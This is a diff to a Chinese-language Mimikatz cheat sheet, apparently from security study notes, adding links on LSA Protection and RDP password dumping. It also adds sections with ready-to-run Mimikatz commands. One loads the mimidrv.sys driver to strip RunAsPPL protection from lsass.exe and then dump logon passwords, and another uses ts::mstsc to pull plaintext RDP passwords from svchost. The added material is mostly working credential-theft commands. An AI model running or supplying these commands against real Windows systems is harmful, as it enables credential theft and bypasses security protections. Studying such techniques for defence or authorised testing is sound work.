@@ -32,6 +32,8 @@
 - [《MiniDumpWriteDump via COM+ Services DLL》的利用测试](https://3gstudent.github.io/3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/)
 - [Extract credentials from lsass remotely](https://en.hackndo.com/remote-lsass-dump-passwords/)
 - [缓解Mimikatz风格攻击](https://xz.aliyun.com/t/4180)
+- [你真的了解LSA Protection (RunAsPPL)吗？](https://mp.weixin.qq.com/s/7DmfWMHjLXTfCHdoOWQ5qA)
+- [从svchost.exe转储RDP在线用户的明文密码](https://mp.weixin.qq.com/s/8UU-w6J7JaNLn7lE1mTHZA)
 
 **辅助项目**
 - [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 纯 Python 的 Mimikatz 实现,Runs on all OS's which support python>=3.6
@@ -674,6 +676,26 @@ misc::clip
 
 ---
 
+# 绕过RunAsPPL
+
+RunAsPPL 有效地阻止了 Mimikatz 访问的内存 lsass.exe
+
+为此，Mimikatz 使用数字签名的驱动程序来删除内核中 Process 对象的保护标志。该文件 mimidrv.sys 必须位于当前文件夹中，以便使用命令作为内核驱动程序服务加载!+。然后，您可以使用命令! processprotect 删除保护并最终访问 lsass.exe。
+```
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+```
+
+完成后，您甚至可以使用相同的命令 “恢复” 保护，而无需使用 / remove 参数，最后使用!- 卸载驱动程序。
+```
+mimikatz # !processprotect /process:lsass.exe
+mimikatz # !-
+```
+
+---
+
 # DPAPI
 
 通过读取 Lsass 进程信息，获取当前系统中的 MasterKey，能获得多个 Master Key file 对应的 MasterKey
@@ -714,6 +736,20 @@ dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSIONID /masterkey:对应GUID�
 ```
 
 ![](../../../assets/img/Security/安全工具/mimikatz/15.png)
+
+---
+
+# MSTSC Passwords
+
+从 Svchost.exe Dump RDP 明文密码
+```bash
+privilege::debug
+ts::mstsc
+```
+
+在 RDP 连接目标时才能抓出来
+
+![](../../../assets/img/Security/安全工具/mimikatz/17.png)
 
 ---
 
